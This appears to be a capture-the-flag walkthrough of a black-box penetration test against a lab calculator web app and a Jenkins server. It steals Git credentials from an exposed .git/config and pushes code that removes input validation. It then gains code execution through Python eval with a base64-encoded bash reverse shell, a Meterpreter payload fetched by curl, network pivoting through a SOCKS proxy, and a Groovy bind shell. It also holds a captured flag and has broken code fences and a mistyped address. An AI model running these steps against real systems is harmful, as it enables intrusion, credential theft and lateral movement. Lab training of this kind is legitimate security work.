# BLACK BOX TESTING 2

## GIVEN   
**MY IP ADDRESS**: 192.32.59.2

## PROCEDURE

### RECON

```
nmap -A --script vuln -p- 192.32.59.2
```

**OPEN PORTS**:<br>
80 http (Apache 2.4.29 Web Server),<br>
5000 http,<br>
8000 http (Python 2.7.17 Web Server)<br>

Port 80 is the default apache page<br>
Port 5000 is a calc webapp<br>
Port 8000 is hosting a git repo<br>

**FILE OF INTEREST**: http://online-calc.com:8000/.git/config

### GIT CREDENTIALS

```
curl http://online-calc.com:8000/.git/config
```

name = Jeremy McCarthy<br>
email = jeremy@dummycorp.com<br>
**password** = diamonds<br>
**username** = jeremy<br>

**GIT UR**L: http://online-calc.com/projects/online-calc

### DISABLE INPUT VALIDATION
```
git clone http://online-calc.com/projects/online-calc
```

Comment out code in API.py:
```
# if not isValid(expr):
#	return error("Invalid expression!")
```

Push changes to git repo
```
git add -A
git commit -m "updated"
git push origin
```

Check if webapp is updated
```
curl http://online-calc.com:8000/API.py
```

### RCE REVERSE SHELL

Calc input is run through python eval function

Reverse shell bash script
```
bash -c 'bash -i >& /dev/tcp/192.32.59.2/1234 0>&1'
```

Reverse shell embedded in python code
```
__import__('os').system("bash -c 'bash -i >& /dev/tcp/192.32.59.2/1234 0>&1'")
```

Encode reverse shell
```
echo "bash -c 'bash -i >& /dev/tcp/192.32.59.2/1234 0>&1'" | base64
```

**ENCODED SCRIPT**:YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMzIuNTkuMi8xMjM0IDA+JjEnCg==

Final python script
```
__import__('os').system("echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMzIuNTkuMi8xMjM0IDA+JjEnCg== | base64 -d | bash")
nmap -A --script vuln -p- 1
```
/tmp/flag

**FLAG**: 3b2b474c06380f696b38c1498f795e054374

```
ip addr
```
Host connected to another network that we can pivot to:<br>
eth0: 192.32.59.3/24 (Current Network)<br>
**eth1**:192.244.194.2/24 (Unreachable Network)

### METERPRETER

Create payload & start server
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.32.59.2 LPORT=4444 -f elf > PAYLOAD
python3 -m http.server 80

Download payload on target machine
```
curl http://192.32.59.2/PAYLOAD > PAYLOAD
```

Set up payload handler in metasploit
```
msfconsole
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 192.32.59.2
set LPORT 4444
exploit

Execute payload
```
chmod +x PAYLOAD
./PAYLOAD
```

### PIVOT

Run port scan on other network
```
run autoroute -s 192.244.194.0/24
background
use auxiliary/scanner/portscan/tcp 
set RHOSTS 192.244.194.0/24
run
```

**IP (OPEN PORT)**: 192.244.19.3 (8080)

Configure port forwarding and run nmap
```
sessions -i 1
portfwd add -l 5555 -p 8080 -r 192.244.194.3
background
nmap -sV -sC -p5555 localhost
```

SERVICE: http (Jetty 9.4.27)

Start proxy server to access website
```
use auxiliary/server/socks_proxy
set SRVPORT 9050 #Default port for proxychains
set VERSION 4a
run
proxychains nmap -sT -P0 192.244.194.3 #Proxies don't support ping so have to use -P0
```

Configure proxy for browser:<br>
- Manual proxy config
- SOCKS Host: 127.0.0.1
- Port: 9050
- Socks v4

Website running Jenkins (automation server)

### GETTING SHELL ACCESS

Execute groovy bind script in the Script Console:
```
int port=6666;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()
Socket s = new java.net.ServerSocket(port).accept()
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Connect to the server
```
nc -v 192.244.194.3 6666
```

